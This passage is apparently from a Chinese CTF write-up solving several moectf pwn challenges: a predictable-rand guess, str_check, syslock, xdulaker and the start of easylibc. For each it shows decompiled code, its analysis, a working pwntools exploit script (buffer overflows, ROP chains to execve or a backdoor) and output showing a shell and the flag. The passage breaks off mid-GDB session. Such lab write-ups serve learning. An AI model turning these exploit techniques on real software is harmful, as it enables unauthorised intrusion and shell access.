    libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    libc.srand(1)
    print(libc.rand())
```

**编写恶意脚本**

```python
from pwn import *
from ctypes import *

r = remote("127.0.0.1", 43597)
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

seed = 1
libc.srand(seed)

for i in range(10):
    r.recvuntil(b">")
    r.sendline(str(libc.rand()%10000).encode())

r.interactive()
```

**运行恶意脚本**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ python3 payload.py
[+] Opening connection to 127.0.0.1 on port 43597: Done
[*] Switching to interactive mode
It opened—how did you do that?
moectf{5UcH-A-F@k3_CH@OT1C-3vIlc880dae2}

[*] Got EOF while reading in interactive
```

**得到：moectf{5UcH-A-F@k3_CH@OT1C-3vIlc880dae2}**



### **str_check**

#### 解题过程

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char dest[24]; // [rsp+0h] [rbp-20h] BYREF
  size_t n; // [rsp+18h] [rbp-8h] BYREF

  init(argc, argv, envp);
  puts("What can u say?");
  __isoc99_scanf("%255s", str);
  puts("So,what size is it?");
  __isoc99_scanf("%zu", &n);
  len = strlen(str);
  if ( (unsigned __int64)len > 0x18 )
  {
    puts("Oh,too much.");
    exit(1);
  }
  if ( !strncmp(str, "meow", 4uLL) )
    memcpy(dest, str, n);
  else
    strncpy(dest, str, n);
  puts("You're right.");
  return 0;
}
```

**分析：**

- 这里有长度限制`if ( (unsigned __int64)len > 0x18 )`，大小是`0x18=16+8=24`，`len`函数的原理是从起点已知读到`\0`我们只需要用`字符不大于24的字符串+\0`就可以绕过长度检测

- 这里有两次输入`__isoc99_scanf("%255s", str);`和`__isoc99_scanf("%zu", &n);`它们分别代表`str`和`n`

  `str`是我们要压入`dest`的东西

  `n`是我们要压入`dest`的字符数

- 这里有两个压入函数需要区分`memcpy(dest, str, n);`和`strncpy(dest, str, n);`

  `memcpy(dest, str, n);`意思是`dest`拷贝`str`的`n`个字节

  `strncpy(dest, str, n);`意思是`dest`拷贝`str`的`n`个字节，不过如果中途有`\0`只会读前一个字节后补`\0`

- 我们这里的缓冲区大小是`len(dest)+len(n)+len(rdp)`

  `dest`大小是`24`

  `n`大小可以看`[rbp-8h]`是`8`

  `rdp`大小是`8`

- 所以我们总缓冲区大小为`24+8+8=40`

填满它的缓冲区后我们就可以实现任意地址的跳转

**找后门函数地址**

```nasm
.text:0000000000401236                 public backdoor
.text:0000000000401236 backdoor        proc near
.text:0000000000401236 ; __unwind {
.text:0000000000401236                 endbr64
.text:000000000040123A                 push    rbp
.text:000000000040123B                 mov     rbp, rsp
.text:000000000040123E                 lea     rax, command    ; "/bin/sh"
.text:0000000000401245                 mov     rdi, rax        ; command
.text:0000000000401248                 call    _system
.text:000000000040124D                 nop
.text:000000000040124E                 pop     rbp
.text:000000000040124F                 retn
.text:000000000040124F ; } // starts at 401236
.text:000000000040124F backdoor        endp
```

**分析：**

- 我们这里跳转地址取`0x40123E`就可以了

- 然后有个问题就是缓冲区后要不要跟`ret`后再接跳转地址

  `ret + addr` 会执行后续代码

  `addr `不会执行后续代码

  我们这里不需要执行后续的代码直接跟

**编写恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 10016)

r.recvuntil(b"What can u say?")
payload = b"meow"+b'\0'
payload += b'a'*(40-payload.__len__())
payload += p64(0x40123E)
r.sendline(payload)

r.recvuntil(b"So,what size is it?")
r.sendline(b"100")

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 10016
[x] Opening connection to 127.0.0.1 on port 10016: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 10016: Done
[*] Switching to interactive mode

You're right.
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{maY6E-THI5-1S-C-strinG6067807f7}
```

**得到：moectf{maY6E-THI5-1S-C-strinG6067807f7}**



### **syslock**

#### 解题过程

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  write(1, "My lock looks strange—can you help me?\n", 0x29uLL);
  write(1, "choose mode\n", 0xCuLL);
  i = input();
  if ( i > 4 )
    lose();
  write(1, "Input your password\n", 0x14uLL);
  read(0, (char *)&s + i, 0xCuLL);
  if ( i != 59 )
    lose();
  cheat();
  return 0;
}

int input()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0xFuLL);
  buf[15] = 0;
  return atoi(buf);
}

void __noreturn lose()
{
  signed __int64 v0; // rax

  v0 = sys_write(1u, "Something wrong.\n", 0x11uLL);
  exit(0);
}

ssize_t cheat()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  write(1, "Developer Mode.\n", 0x10uLL);
  return read(0, buf, 0x100uLL);
}
```

**分析：**

- 这里有三处输入`i = input();`、`read(0, (char *)&s + i, 0xCuLL);`、`return read(0, buf, 0x100uLL);`
- `i`要求不大于`4`，`&s+i`的值要求等于`59`，那么`&s+i`的地址就必须指向`i`本省即等于`&i`，算一下`&i = &s + i`那么`i = &i - &s`我们已知栈地址是向下生长的，即`高地址向低地址生长`，所以`i`一定会是负数，满足`i <= 4`
- 然后我们看到`return read(0, buf, 0x100uLL);`处有明显的栈溢出

**信息搜集**

我们先计算`i`，先搜集`i`和`s`的地址

```nasm
.bss:0000000000404080                 public i
.bss:0000000000404080 i               dd ?                    ; DATA XREF: main+4E↑w
.bss:0000000000404080                                         ; main+54↑r ...
.bss:0000000000404084                 align 20h
.bss:00000000004040A0                 public s
.bss:00000000004040A0 s               db    ? ;               ; DATA XREF: main+8A↑o
```

计算`i = &i - &s = 0x404080 - 0x4040A0 = 0x80 - 0xA0 = -0x20 = -32`所以`i = -32`

然后找一下有没有后门函数

发现并没有后门函数，但是我们发现了lose函数一处系统调用

```c
v0 = sys_write(1u, "Something wrong.\n", 0x11uLL);
```

我们找一下lose函数的汇编代码

```nasm
.text:00000000004011FD                 public lose
.text:00000000004011FD lose            proc near               ; CODE XREF: main+64↓p
.text:00000000004011FD                                         ; main+C2↓p
.text:00000000004011FD
.text:00000000004011FD buf             = qword ptr -8
.text:00000000004011FD
.text:00000000004011FD ; __unwind {
.text:00000000004011FD                 endbr64
.text:0000000000401201                 push    rbp
.text:0000000000401202                 mov     rbp, rsp
.text:0000000000401205                 sub     rsp, 10h
.text:0000000000401209                 lea     rax, aSomethingWrong ; "Something wrong.\n"
.text:0000000000401210                 mov     [rbp+buf], rax
.text:0000000000401214                 mov     rcx, [rbp+buf]
.text:0000000000401218                 mov     rax, 1
.text:000000000040121F                 mov     rdi, 1          ; fd
.text:0000000000401226                 mov     rsi, rcx        ; buf
.text:0000000000401229                 mov     rdx, 11h        ; count
.text:0000000000401230                 syscall                 ; LINUX - sys_write
.text:0000000000401232                 mov     edi, 0          ; status
.text:0000000000401237                 call    _exit
.text:0000000000401237 ; } // starts at 4011FD
.text:0000000000401237 lose            endp
```

注意到这里(注意力惊人)

```nasm
.text:0000000000401230                 syscall                 ; LINUX - sys_write
```

我们很容易想到用`system.call("bin/sh",0,0,59);`

参数的寄存器分别是`rdi`、`rsi`、`rdx`、`rax`

我们先看一下它有没有`PIE`保护

```shell
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ checksec pwn
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

没有`PIE`保护，我们找一下寄存器地址

```shell
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ ropper -f pwn --search "pop"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: pwn
0x0000000000401244: pop rax; ret; 
0x000000000040119d: pop rbp; ret; 
0x0000000000401240: pop rdi; pop rsi; pop rdx; ret; 
0x0000000000401242: pop rdx; ret; 
0x0000000000401241: pop rsi; pop rdx; ret;
```

直接找到`0x0000000000401240: pop rdi; pop rsi; pop rdx; ret; `和`0x0000000000401244: pop rax; ret; `

那`bin/sh`在哪里找呢？

还记得这个吗？

```c
read(0, (char *)&s + i, 0xCuLL);
```

它读了12个字节，而我们的`59`只有两个字节，我们改成p32(59)就有了4个字节

```nasm
.bss:0000000000404080                 public i
.bss:0000000000404080 i               dd ?                    ; DATA XREF: main+4E↑w
.bss:0000000000404080                                         ; main+54↑r ...
.bss:0000000000404084                 align 20h
.bss:00000000004040A0                 public s
.bss:00000000004040A0 s               db    ? ;               ; DATA XREF: main+8A↑o
```

刚好可以覆盖到`0x404084`

信息搜集完毕

**编写恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 7778)

r.sendafter(b"choose mode\n", b"-32")
r.sendafter(b"Input your password\n", p32(59)+b"/bin/sh")
pop_rdi_rsi_rdx_addr = 0x401240
bin_sh_addr = 0x404084
pop_rax_addr = 0x401244
syscall_addr = 0x401230
payload = b'a'*(64+8) + p64(pop_rdi_rsi_rdx_addr) + p64(bin_sh_addr) + p64(0) + p64(0) + p64(pop_rax_addr) + p64(59) + p64(syscall_addr)
r.sendafter(b"Developer Mode.\n", payload)

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 7778
[x] Opening connection to 127.0.0.1 on port 7778: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 7778: Done
[*] Switching to interactive mode
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{donT_enC@p5Ul@t3_MY_sy5c4LL147dd8b}
```

**得到：moectf{donT_enC@p5Ul@t3_MY_sy5c4LL147dd8b}**



### **xdulaker**

#### 解题过程

**下载解压扔进IDA查看源码**

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  menu();
  while ( 1 )
  {
    while ( 1 )
    {
      putchar(62);
      __isoc99_scanf("%d", &opt);
      if ( opt != 1 )
        break;
      pull();
    }
    if ( opt == 2 )
    {
      photo();
    }
    else
    {
      if ( opt != 3 )
        exit(0);
      laker();
    }
  }
}

int menu()
{
  puts("A freshman has walked into the lake.");
  puts("1.Pull him out");
  puts("2.Take a photo of him");
  puts("3.Walk into the lake.");
  return puts("Your choice");
}

int pull()
{
  return printf("Thanks,I'll give you a gift:%p\n", &opt);
}

int photo()
{
  _BYTE buf[80]; // [rsp+0h] [rbp-50h] BYREF

  puts("Hey,what's your name?!");
  read(0, buf, 0x40uLL);
  return puts("I will teach you a lesson.");
}

ssize_t laker()
{
  _BYTE s1[48]; // [rsp+0h] [rbp-30h] BYREF

  if ( memcmp(s1, "xdulaker", 8uLL) )
  {
    puts("You are not him.");
    exit(0);
  }
  puts("welcome,xdulaker");
  return read(0, s1, 0x100uLL);
}
```

**分析：**

- `opt == 1`泄露`opt`的内存地址

- `opt == 2`设置`buf`的内存值，无栈溢出

- `opt == 3`若`memcmp(s1, "xdulaker", 8uLL)`则触发`return read(0, s1, 0x100uLL);`栈溢出

- 注意到`_BYTE buf[80]; // [rsp+0h] [rbp-50h] BYREF`和`_BYTE s1[48]; // [rsp+0h] [rbp-30h] BYREF`

  `buf`距离`rbp`**0x50**个距离，可以存`80`个字节

  `s1`距离`rbp`**0x30**个距离

  也就是说我们可以用`buf`的内存值来覆盖掉`s1`的内存值

**构造测试脚本**

```python
from pwn import *

r = remote("127.0.0.1", 5178)

r.recvuntil(b'>')
r.sendline(b'2')
r.sendafter(b"Hey,what's your name?!",b'a'*0x20+b"xdulaker")

r.recvuntil(b'>')
r.sendline(b'3')

r.interactive()
```

**运行测试脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 5178
[x] Opening connection to 127.0.0.1 on port 5178: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5178: Done
[*] Switching to interactive mode
welcome,xdulaker
```

预期成功达到

**信息搜集**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ file pwn
pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e0643d1860124e563bb8a3c7a40735aed30dad57, for GNU/Linux 3.2.0, not stripped
```

**分析：**

- 64位小端序
- 有`libc.so.6`和`ld-linux-x86-64.so.2`

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ checksec pwn
[*] '/home/kali/Desktop/ctf/xdulaker/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析：**

- 存在`PIE`随机基址

想到用`puts`泄露`libc_base_addr`

`puts_got`

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ readelf -s libc.so.6 | grep "puts@@GLIBC"
   808: 000000000007fa00   294 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
  1429: 0000000000080e50   409 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
  1438: 0000000000080e50   409 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
```

`puts_plt`

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ objdump -d pwn | grep "puts@plt"         
00000000000010e0 <puts@plt>:
    12bc:       e8 1f fe ff ff          call   10e0 <puts@plt>
    12cb:       e8 10 fe ff ff          call   10e0 <puts@plt>
    12da:       e8 01 fe ff ff          call   10e0 <puts@plt>
    12e9:       e8 f2 fd ff ff          call   10e0 <puts@plt>
    12f8:       e8 e3 fd ff ff          call   10e0 <puts@plt>
    133f:       e8 9c fd ff ff          call   10e0 <puts@plt>
    1364:       e8 77 fd ff ff          call   10e0 <puts@plt>
    13a1:       e8 3a fd ff ff          call   10e0 <puts@plt>
    13ba:       e8 21 fd ff ff          call   10e0 <puts@plt>
```

`main`

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ readelf -s pwn | grep "main"       
    45: 00000000000013d8   147 FUNC    GLOBAL DEFAULT   16 main
```

`pop_rdi_ret`

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ ropper -f libc.so.6 --search "pop rdi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: libc.so.6
0x000000000002a3e5: pop rdi; ret; 
0x00000000000eb96d: pop rdi; retf; dec dword ptr [rax - 0x77]; ret 0x8949;
```

`ret`

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/xdulaker]
└─$ ropper -f libc.so.6 --search "ret 0;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret 0;

[INFO] File: libc.so.6
0x000000000002db7d: ret 0;
```

准备构造`pop_rdi_ret + puts_got + puts_plt + main`然后泄露`puts_addr`用`libc_base = puts_addr - puts_offset`时

发现，原来它有给后门函数

```c
int backdoor()
{
  return system("/bin/sh");
}
```

查看汇编代码

```nasm
.text:0000000000001249                 public backdoor
.text:0000000000001249 backdoor        proc near
.text:0000000000001249 ; __unwind {
.text:0000000000001249                 endbr64
.text:000000000000124D                 push    rbp
.text:000000000000124E                 mov     rbp, rsp
.text:0000000000001251                 lea     rax, command    ; "/bin/sh"
.text:0000000000001258                 mov     rdi, rax        ; command
.text:000000000000125B                 call    _system
.text:0000000000001260                 nop
.text:0000000000001261                 pop     rbp
.text:0000000000001262                 retn
.text:0000000000001262 ; } // starts at 1249
.text:0000000000001262 backdoor        endp
```

注意到`.text:0000000000001251                 lea     rax, command    ; "/bin/sh"`

我们取`backdoor_offset = 0x1251 `

**构造恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 5178)

r.recvuntil(b'>')
r.sendline(b'1')
opt_addr = int(r.recvline().replace(b"Thanks,I'll give you a gift:",b'').strip(), 16)
opt_offset = 0x4010
base_addr = opt_addr - opt_offset
backdoor_offset = 0x1251
backdoor_addr = base_addr + backdoor_offset

r.recvuntil(b'>')
r.sendline(b'2')
r.sendafter(b"Hey,what's your name?!",b'a'*0x20+b"xdulaker")

r.recvuntil(b'>')
r.sendline(b'3')
payload = b'a'*(48+8)
r.sendline(payload+p64(backdoor_addr))

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 5178
[x] Opening connection to 127.0.0.1 on port 5178: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 5178: Done
[*] Switching to interactive mode
welcome,xdulaker
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{b3-CaReFuL-0f_tHe-l@Ke317b11673}
```

**得到：moectf{b3-CaReFuL-0f_tHe-l@Ke317b11673}**



### **easylibc**

#### 解题过程

**审计题目**

> 相信做了前面题的你，已经初步开始了解我们如何利用栈溢出来控制程序的执行流程了。在这道题，你将理解动态链接与延迟绑定，这里开启了ASLR和PIE，但是，我给了你一个小礼物来应对两个防护，务必妥善保管！ 这个礼物某种情况下还会发生改变，成为另一种神兵利器，至于怎么改变，就要靠你自己去摸索了！
>
> 建议你利用gdb，完整的跟踪一下整个动态链接和延迟绑定的过程，这样你能更了解它究竟是怎么完成这个工作的，同时有助于你更加的了解ret2libc这种攻击。

**分析：**

- 这里用到了`PIE`随机基址
- 这里用到了`ASLR`随机栈分布

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(_bss_start, 0LL);
  printf("What is this?\nHow can I use %p without a backdoor? Damn!\n", &read);
  vuln();
  puts("Something happening");
  return 0;
}

ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  return read(0, buf, 0x60uLL);
}
```

**分析：**

- 它这里`printf("What is this?\nHow can I use %p without a backdoor? Damn!\n", &read);`泄露了`read@plt`
- 这里`return read(0, buf, 0x60uLL);`存在明显的栈溢出

这里用到的保护模式挺多的，我们先信息搜集一下

**信息搜集**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ file pwn
pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=58ab7c4101905b74a12de9a3f92cf32abe7e2323, for GNU/Linux 3.2.0, not stripped
                                                                                                                              
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ checksec pwn
[*] '/home/kali/Desktop/ctf/ezlibc/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析：**

- linux64位小端序可运行程序
- 有`PIE`
- 有`NX`
- 无`canary`

然后测试一下

**终端测试**

```shell
C:\Users\probie>nc 127.0.0.1 6626
What is this?
How can I use 0x5587754c9060 without a backdoor? Damn!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789
```

**GDB测试**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ gdb pwn
GNU gdb (Debian 16.3-5) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 215 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from pwn...
(No debugging symbols found in pwn)
------- tip of the day (disable with set show-tips off) -------
Use the context (or ctx) command to display the context once again. You can reconfigure the context layout with set context-section <sections> or forward the output to a file/tty via set context-output <file>. See also config context to configure it further!
pwndbg> b main
Breakpoint 1 at 0x11d6
pwndbg> r
Starting program: /home/kali/Desktop/ctf/ezlibc/pwn 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555551d6 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
 RAX  0x5555555551ce (main) ◂— endbr64 
 RBX  0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
 RCX  0x555555557df0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555160 (__do_global_dtors_aux) ◂— endbr64 
 RDX  0x7fffffffddf8 —▸ 0x7fffffffe18f ◂— 'COLORFGBG=15;0'
 RDI  1
 RSI  0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
 R8   0
 R9   0x7ffff7fcbc80 (_dl_fini) ◂— push rbp
 R10  0x7fffffffda10 ◂— 0x800000
 R11  0x206
 R12  0
 R13  0x7fffffffddf8 —▸ 0x7fffffffe18f ◂— 'COLORFGBG=15;0'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0x555555557df0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555160 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7fffffffdcd0 ◂— 1
 RSP  0x7fffffffdcd0 ◂— 1
 RIP  0x5555555551d6 (main+8) ◂— sub rsp, 0x10
─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────
 ► 0x5555555551d6 <main+8>     sub    rsp, 0x10                         RSP => 0x7fffffffdcc0 (0x7fffffffdcd0 - 0x10)
   0x5555555551da <main+12>    mov    rax, qword ptr [rip + 0x2e67]     RAX, [stdout@GLIBC_2.2.5] => 0x7ffff7f915c0 (_IO_2_1_stdout_) ◂— 0xfbad2084                                                                                                         
   0x5555555551e1 <main+19>    mov    esi, 0                            ESI => 0
   0x5555555551e6 <main+24>    mov    rdi, rax                          RDI => 0x7ffff7f915c0 (_IO_2_1_stdout_) ◂— 0xfbad2084
   0x5555555551e9 <main+27>    call   setbuf@plt                  <setbuf@plt>
 
   0x5555555551ee <main+32>    lea    rax, [rip + 0x2e3b]          RAX => 0x555555558030 (read@got[plt])
   0x5555555551f5 <main+39>    mov    qword ptr [rbp - 8], rax
   0x5555555551f9 <main+43>    mov    rax, qword ptr [rbp - 8]
   0x5555555551fd <main+47>    mov    rax, qword ptr [rax]
   0x555555555200 <main+50>    mov    rsi, rax
   0x555555555203 <main+53>    lea    rax, [rip + 0xdfe]           RAX => 0x555555556008 ◂— 'What is this?\nHow can I use %p without a backdoor?...'
──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdcd0 ◂— 1
01:0008│+008     0x7fffffffdcd8 —▸ 0x7ffff7dd2ca8 (__libc_start_call_main+120) ◂— mov edi, eax
02:0010│+010     0x7fffffffdce0 —▸ 0x7fffffffddd0 —▸ 0x7fffffffddd8 ◂— 0x38 /* '8' */
03:0018│+018     0x7fffffffdce8 —▸ 0x5555555551ce (main) ◂— endbr64 
04:0020│+020     0x7fffffffdcf0 ◂— 0x155554040
05:0028│+028     0x7fffffffdcf8 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
06:0030│+030     0x7fffffffdd00 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
07:0038│+038     0x7fffffffdd08 ◂— 0x61ed5735bf00b02e
────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────
 ► 0   0x5555555551d6 main+8
   1   0x7ffff7dd2ca8 __libc_start_call_main+120
   2   0x7ffff7dd2d65 __libc_start_main+133
   3   0x5555555550e5 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> b *$rebase(0x11C6)
Breakpoint 2 at 0x5555555551c6
pwndbg> c
Continuing.
What is this?
How can I use 0x555555555060 without a backdoor? Damn!

Breakpoint 2, 0x00005555555551c6 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
*RAX  0x7fffffffdc90 ◂— 0
 RBX  0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
*RCX  0
*RDX  0x60
*RDI  0
*RSI  0x7fffffffdc90 ◂— 0
 R8   0
*R9   0
*R10  0
*R11  0x202
 R12  0
 R13  0x7fffffffddf8 —▸ 0x7fffffffe18f ◂— 'COLORFGBG=15;0'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0x555555557df0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555160 (__do_global_dtors_aux) ◂— endbr64 
*RBP  0x7fffffffdcb0 —▸ 0x7fffffffdcd0 ◂— 1
*RSP  0x7fffffffdc90 ◂— 0
*RIP  0x5555555551c6 (vuln+29) ◂— call read@plt
─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────
 ► 0x5555555551c6 <vuln+29>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7fffffffdc90 ◂— 0
        nbytes: 0x60
 
   0x5555555551cb <vuln+34>    nop    
   0x5555555551cc <vuln+35>    leave  
   0x5555555551cd <vuln+36>    ret    
 
   0x5555555551ce <main>       endbr64 
   0x5555555551d2 <main+4>     push   rbp
   0x5555555551d3 <main+5>     mov    rbp, rsp
b+ 0x5555555551d6 <main+8>     sub    rsp, 0x10
   0x5555555551da <main+12>    mov    rax, qword ptr [rip + 0x2e67]     RAX, [stdout@GLIBC_2.2.5]
   0x5555555551e1 <main+19>    mov    esi, 0                            ESI => 0
   0x5555555551e6 <main+24>    mov    rdi, rax
──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ rax rsi rsp 0x7fffffffdc90 ◂— 0
01:0008│-018         0x7fffffffdc98 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
02:0010│-010         0x7fffffffdca0 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
03:0018│-008         0x7fffffffdca8 —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
04:0020│ rbp         0x7fffffffdcb0 —▸ 0x7fffffffdcd0 ◂— 1
05:0028│+008         0x7fffffffdcb8 —▸ 0x555555555221 (main+83) ◂— lea rax, [rip + 0xe1a]
06:0030│+010         0x7fffffffdcc0 ◂— 0
07:0038│+018         0x7fffffffdcc8 —▸ 0x555555558030 (read@got[plt]) —▸ 0x555555555060 ◂— endbr64 
────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────
 ► 0   0x5555555551c6 vuln+29
   1   0x555555555221 main+83
   2   0x7ffff7dd2ca8 __libc_start_call_main+120
   3   0x7ffff7dd2d65 __libc_start_main+133
   4   0x5555555550e5 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789  
0x00005555555551cb in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
*RAX  0x32
 RBX  0x7fffffffdde8 —▸ 0x7fffffffe16d ◂— '/home/kali/Desktop/ctf/ezlibc/pwn'
*RCX  0x7ffff7f915c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RDX  0x32
 RDI  0
 RSI  0x7fffffffdc90 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789\n'
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffddf8 —▸ 0x7fffffffe18f ◂— 'COLORFGBG=15;0'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0x555555557df0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555160 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7fffffffdcb0 ◂— 'aaaaaaaa123456789\n'
 RSP  0x7fffffffdc90 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789\n'
*RIP  0x5555555551cb (vuln+34) ◂— nop 
